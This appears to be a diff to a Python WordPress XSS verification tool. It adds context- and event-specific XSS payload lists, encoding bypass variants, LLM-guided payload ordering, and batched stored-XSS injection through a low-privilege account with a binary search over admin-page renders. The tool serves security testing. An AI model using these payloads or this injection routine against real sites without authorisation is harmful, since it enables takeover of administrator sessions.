@@ -6124,6 +6124,7 @@ def verify_wordpress_xss(
     payload_transform: str = "",
     extra_inject_params: Optional[dict] = None,
     render_context: str = "unknown",
+    synth_hints: Optional[dict] = None,
 ) -> WpVerifyResult:
     """Verifica XSS en dos modos:
 
@@ -6244,9 +6245,160 @@ def verify_wordpress_xss(
         from .payload_kb import load_xss_payloads
         attempts += load_xss_payloads(js)
 
+        # ── Priorización por hints del LLM (síntesis) ──────────────────────────────────────
+        # Si el LLM detectó el contexto de inyección y/o el event handler exacto, construimos
+        # payloads específicos a medida y los ponemos PRIMERO — esto hace que con alta
+        # probabilidad el payload ganador esté en el primer batch (32 intentos) en vez de
+        # potencialmente en el batch 16 de 17. Es el "razonamiento sobre payloads" vs fuerza bruta.
+        if synth_hints:
+            _sctx  = (synth_hints.get("xss_context") or "").lower().strip()
+            _sevt  = (synth_hints.get("event_handler") or "").lower().strip()
+            _senc  = (synth_hints.get("encoding_bypass") or "none").lower().strip()
+            _synth_priority: list = []
+
+            # 1. Payloads específicos del event_handler que el LLM predijo
+            _EVT_PAYLOADS = {
+                "onerror": [
+                    f"<img src=x onerror=\"{js}\">",
+                    f"\"><img src=x onerror=\"{js}\">",
+                    f"'><img src=x onerror=\"{js}\">",
+                    f"\"><img src=x onerror='{js}'>",
+                    f"<img src=x onerror={js}>",
+                    f"<video><source onerror=\"{js}\"></video>",
+                    f"<audio src=x onerror=\"{js}\">",
+                    f"<object data=x onerror=\"{js}\">",
+                ],
+                "onload": [
+                    f"<svg onload=\"{js}\">",
+                    f"<body onload=\"{js}\">",
+                    f"\"><svg onload=\"{js}\">",
+                    f"<iframe onload=\"{js}\" src=x>",
+                    f"<img src=x onload=\"{js}\">",
+                ],
+                "onmouseover": [
+                    f"\" onmouseover=\"{js}\" x=\"",
+                    f"' onmouseover='{js}' x='",
+                    f"<a onmouseover=\"{js}\">x</a>",
+                    f"\"><a onmouseover=\"{js}\">x</a>",
+                ],
+                "onfocus": [
+                    f"\" autofocus onfocus=\"{js}\" x=\"",
+                    f"' autofocus onfocus='{js}' x='",
+                    f"<input autofocus onfocus=\"{js}\">",
+                    f"\"><input autofocus onfocus=\"{js}\">",
+                ],
+                "ontoggle": [
+                    f"<details open ontoggle=\"{js}\">x</details>",
+                    f"\"><details open ontoggle=\"{js}\">x</details>",
+                ],
+                "onstart": [
+                    f"<marquee onstart=\"{js}\">x</marquee>",
+                ],
+                "onclick": [
+                    f"\" onclick=\"{js}\" x=\"",
+                    f"<a href=# onclick=\"{js}\">x</a>",
+                    f"\"><a href=# onclick=\"{js}\">x</a>",
+                ],
+                "onanimationend": [
+                    f"<div style=\"animation:x 0s\" onanimationend=\"{js}\">x</div>",
+                    f"\"><div style=\"animation:x 0s\" onanimationend=\"{js}\">x</div>",
+                ],
+                "onpointerover": [
+                    f"\" onpointerover=\"{js}\" x=\"",
+                    f"<div onpointerover=\"{js}\">x</div>",
+                ],
+            }
+            if _sevt and _sevt in _EVT_PAYLOADS:
+                _synth_priority.extend(_EVT_PAYLOADS[_sevt])
+
+            # 2. Payloads específicos del contexto de inyección
+            _CTX_PRIORITY = {
+                "html_body": [
+                    f"<script>{js}</script>",
+                    f"<img src=x onerror=\"{js}\">",
+                    f"<svg onload=\"{js}\">",
+                    f"<details open ontoggle=\"{js}\">x</details>",
+                    f"<ScRiPt>{js}</sCrIpT>",
+                ],
+                "attribute": [
+                    f"\"><img src=x onerror=\"{js}\">",
+                    f"'><img src=x onerror=\"{js}\">",
+                    f"\"><svg onload=\"{js}\">",
+                    f"\" onmouseover=\"{js}\" x=\"",
+                    f"' onmouseover='{js}' x='",
+                    f"\" autofocus onfocus=\"{js}\" x=\"",
+                    f"\"><script>{js}</script>",
+                    f"'><script>{js}</script>",
+                ],
+                "js_string": [
+                    f"';{js};//",
+                    f'";{js};//',
+                    f"`\";{js};//",
+                    f"</script><script>{js}</script>",
+                    f"\\';{js};//",
+                    f'\\";{js};//',
+                ],
+                "js_innerHTML": [
+                    f"\"><img src=x onerror=\"{js}\">",
+                    f"'><img src=x onerror=\"{js}\">",
+                    f"\"><svg onload=\"{js}\">",
+                    f"\" onmouseover=\"{js}\" x=\"",
+                    f"\"><script>{js}</script>",
+                ],
+                "url": [
+                    f"javascript:{js}",
+                    f"jav&#x09;ascript:{js}",
+                    f"\"><img src=x onerror=\"{js}\">",
+                    f"\"><svg onload=\"{js}\">",
+                ],
+                "href": [
+                    f"javascript:{js}",
+                    f"jav&#x09;ascript:{js}",
+                    f"\"><img src=x onerror=\"{js}\">",
+                    f"\" onmouseover=\"{js}\" x=\"",
+                ],
+                "css": [
+                    f"</style><script>{js}</script>",
+                    f"</style><img src=x onerror=\"{js}\">",
+                    f"expression({js})",
+                ],
+                "dom": [
+                    f"<img src=x onerror=\"{js}\">",
+                    f"<svg onload=\"{js}\">",
+                    f"javascript:{js}",
+                    f"';{js};//",
+                    f'";{js};//',
+                ],
+            }
+            for _c in [_sctx, _sctx.replace("_", " ")]:
+                if _c and _c in _CTX_PRIORITY:
+                    for p in _CTX_PRIORITY[_c]:
+                        if p not in _synth_priority:
+                            _synth_priority.append(p)
+                    break
+
+            # 3. Si hay encoding_bypass, añadir versiones codificadas de los primeros payloads
+            if _synth_priority and _senc not in ("none", "", "unknown"):
+                import urllib.parse as _up
+                _encoded_extra = []
+                for p in _synth_priority[:8]:
+                    if _senc in ("url_encode", "url-encode", "urlencode"):
+                        _encoded_extra.append(_up.quote(p))
+                    elif _senc in ("double_encode", "double-encode"):
+                        _encoded_extra.append(_up.quote(_up.quote(p)))
+                    elif _senc in ("html_entity", "html-entity", "html_encode"):
+                        _encoded_extra.append(p.replace("<", "&lt;").replace(">", "&gt;")
+                                               .replace("\"", "&quot;").replace("'", "&#x27;"))
+                _synth_priority = _encoded_extra + _synth_priority
+
+            # Insertar synth_priority AL PRINCIPIO de attempts, eliminando duplicados
+            if _synth_priority:
+                _synth_set = set(_synth_priority)
+                attempts = _synth_priority + [a for a in attempts if a not in _synth_set]
+
         # Si el scanner deterministico detecto el contexto de renderizado, reorganizar
         # attempts para probar primero los payloads especificos de ese contexto.
-        # El resto queda al final como red de seguridad, pero normalmente no se llega.
+        # (Si ya hay synth_priority, el contexto estático refuerza el orden pero no lo contradice.)
         if render_context and render_context != "unknown":
             _CTX_PAYLOADS = {
                 # Valor cae dentro de href="VALUE" o similar — necesita romper el atributo
@@ -6293,7 +6445,15 @@ def verify_wordpress_xss(
             if _priority:
                 _priority_set = set(_priority)
                 _rest = [a for a in attempts if a not in _priority_set]
-                attempts = _priority + _rest
+                # Si synth_priority ya ocupa las primeras posiciones no las desplazamos;
+                # solo anteponemos los payloads del contexto estático que synth no cubrió.
+                if synth_hints and _synth_priority:
+                    _synth_set2 = set(_synth_priority)
+                    _ctx_new = [p for p in _priority if p not in _synth_set2]
+                    _rest2 = [a for a in _rest if a not in set(_ctx_new)]
+                    attempts = _synth_priority + _ctx_new + _rest2
+                else:
+                    attempts = _priority + _rest
 
         found = False
         tried = []
@@ -6307,68 +6467,92 @@ def verify_wordpress_xss(
         if stored_xss_view_path:
             step(f"modo stored-XSS (dos pasos): inyectando via subscriber -> admin carga "
                  f"'{stored_xss_view_path}'...")
-            step(f"arrancando Chromium headless (modo stored-XSS, {len(attempts)} payloads)...")
+            # Estrategia batch + búsqueda binaria:
+            # En vez de hacer 1 render Chromium por payload (532 renders × ~2.5s = ~22min),
+            # inyectamos un lote completo via HTTP (rápido) y hacemos UN solo render para
+            # comprobar si alguno disparó. Si disparó, búsqueda binaria para encontrar el
+            # payload exacto. Coste: O(log N) renders ≈ 9 renders para 532 payloads vs 532.
+            import base64 as _base64
+
+            def _do_inject(pv: str) -> bool:
+                """Inyecta un único payload via HTTP. Devuelve True si no hubo error."""
+                _ep = _base64.b64encode(pv.encode()).decode() if payload_transform == "base64" else pv
+                _pi = dict(base_params)
+                _pi[xss_param] = _ep
+                _ih = {}
+                if "/wp-json/" in endpoint:
+                    _ih = {"User-Agent": (
+                        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
+                        "AppleWebKit/537.36 (KHTML, like Gecko) "
+                        "Chrome/120.0.0.0 Safari/537.36")}
+                try:
+                    boot.sub_sess.request(
+                        m, boot.base_url + endpoint, timeout=20,
+                        data=_pi if m != "GET" else None,
+                        params=_pi if m == "GET" else None,
+                        headers=_ih or None)
+                    return True
+                except Exception as _e:
+                    tried.append({"payload": pv, "paso1_error": str(_e)})
+                    return False
+
+            _BATCH = 32  # payloads por lote — balance entre colisiones y nro renders
+            step(f"arrancando Chromium headless (modo stored-XSS, {len(attempts)} payloads, "
+                 f"estrategia batch={_BATCH}+binaria)...")
             with _XssBrowserSession() as xb:
-                import base64 as _base64
-                for payload_value in attempts:
-                    params_inject = dict(base_params)
-                    # Aplicar transformacion de payload si el endpoint lo requiere
-                    # (ej: WP Statistics espera page_uri base64-encoded para bypass de sanitize_url)
-                    _effective_payload = payload_value
-                    if payload_transform == "base64":
-                        _effective_payload = _base64.b64encode(
-                            payload_value.encode()).decode()
-                    params_inject[xss_param] = _effective_payload
-                    # PASO 1: subscriber inyecta (peticion HTTP, sin render).
-                    # Si el endpoint es REST API (/wp-json/...) usamos User-Agent de navegador real
-                    # para evitar que el plugin identifique la peticion como bot y la ignore.
-                    _inject_headers = {}
-                    if "/wp-json/" in endpoint:
-                        _inject_headers = {"User-Agent": (
-                            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
-                            "AppleWebKit/537.36 (KHTML, like Gecko) "
-                            "Chrome/120.0.0.0 Safari/537.36")}
-                    try:
-                        boot.sub_sess.request(
-                            m, boot.base_url + endpoint, timeout=20,
-                            data=params_inject if m != "GET" else None,
-                            params=params_inject if m == "GET" else None,
-                            headers=_inject_headers if _inject_headers else None)
-                    except Exception as e:
-                        tried.append({"payload": payload_value, "paso1_error": str(e)})
-                        continue
-                    # PASO 2: admin abre la pagina de vista -- si el payload se renderiza ahi
-                    # y ejecuta JS, document.title cambia al marcador.
-                    # wait_for_xss_title: espera activamente hasta que el titulo cambie a
-                    # algo que empiece por 'binoracle-xss-' (cubre AJAX-lazy views como
-                    # WP Statistics overview que carga los datos post-load-event).
-                    title, _ = xb.render(boot.base_url, stored_xss_view_path,
-                                         "GET", {}, admin_cookies,
-                                         wait_for_xss_title="binoracle-xss-")
-                    tried.append({"payload": payload_value, "title_tras_vista_admin": title})
-                    if title == marker:
-                        found = True
-                        res.evidence["payload_ganador"] = payload_value
-                        res.evidence["stored_xss_view_path"] = stored_xss_view_path
-                        step(f"VERIFICADO (stored XSS): el admin cargo '{stored_xss_view_path}' "
-                             f"y el navegador ejecuto el script inyectado -- document.title = "
-                             f"'{marker}'.")
-                        _, png = xb.render(boot.base_url, stored_xss_view_path,
-                                           "GET", {}, admin_cookies, capture=True)
-                        if png:
-                            boot.shots.append({
-                                "caption_es": (f"Paso 5: Stored XSS confirmado -- el admin cargo "
-                                              f"'{stored_xss_view_path}' y el navegador REAL ejecuto "
-                                              f"el script inyectado en '{xss_param}', cambiando "
-                                              f"document.title al marcador '{marker}'."),
-                                "caption_en": (f"Step 5: Stored XSS confirmed -- admin loaded "
-                                              f"'{stored_xss_view_path}' and the REAL browser executed "
-                                              f"the script injected via '{xss_param}', changing "
-                                              f"document.title to marker '{marker}'."),
-                                "png_b64": png, "url": boot.base_url + stored_xss_view_path})
+
+                def _render_check() -> str:
+                    t, _ = xb.render(boot.base_url, stored_xss_view_path,
+                                     "GET", {}, admin_cookies,
+                                     wait_for_xss_title="binoracle-xss-")
+                    return t
+
+                # Fase 1: inyectar lotes y detectar en qué lote dispara
+                _winning_batch: list = []
+                for _bi in range(0, len(attempts), _BATCH):
+                    _batch = attempts[_bi: _bi + _BATCH]
+                    for pv in _batch:
+                        _do_inject(pv)
+                    _t = _render_check()
+                    if _t == marker:
+                        _winning_batch = _batch
+                        step(f"batch [{_bi}..{_bi+len(_batch)-1}] disparó XSS — "
+                             f"buscando payload exacto via búsqueda binaria...")
                         break
-                    # limpiar el payload inyectado antes del siguiente intento si es posible
-                    # (opcional -- si el plugin no tiene delete endpoint simplemente se acumula)
+
+                # Fase 2: búsqueda binaria dentro del lote ganador
+                if _winning_batch:
+                    _lo, _hi = 0, len(_winning_batch)
+                    while _hi - _lo > 1:
+                        _mid = (_lo + _hi) // 2
+                        for pv in _winning_batch[_lo:_mid]:
+                            _do_inject(pv)
+                        _t = _render_check()
+                        if _t == marker:
+                            _hi = _mid
+                        else:
+                            _lo = _mid
+                    _winner = _winning_batch[_lo]
+                    found = True
+                    res.evidence["payload_ganador"] = _winner
+                    res.evidence["stored_xss_view_path"] = stored_xss_view_path
+                    step(f"VERIFICADO (stored XSS): el admin cargo '{stored_xss_view_path}' "
+                         f"y el navegador ejecuto el script inyectado -- document.title = "
+                         f"'{marker}'. Payload: {_winner[:100]}")
+                    tried.append({"payload": _winner, "title_tras_vista_admin": marker})
+                    _, png = xb.render(boot.base_url, stored_xss_view_path,
+                                       "GET", {}, admin_cookies, capture=True)
+                    if png:
+                        boot.shots.append({
+                            "caption_es": (f"Paso 5: Stored XSS confirmado -- el admin cargo "
+                                          f"'{stored_xss_view_path}' y el navegador REAL ejecuto "
+                                          f"el script inyectado en '{xss_param}', cambiando "
+                                          f"document.title al marcador '{marker}'."),
+                            "caption_en": (f"Step 5: Stored XSS confirmed -- admin loaded "
+                                          f"'{stored_xss_view_path}' and the REAL browser executed "
+                                          f"the script injected via '{xss_param}', changing "
+                                          f"document.title to marker '{marker}'."),
+                            "png_b64": png, "url": boot.base_url + stored_xss_view_path})
 
         # ── MODO 1: Reflected / same-response ───────────────────────────────────────────────
         if not found and not stored_xss_view_path:
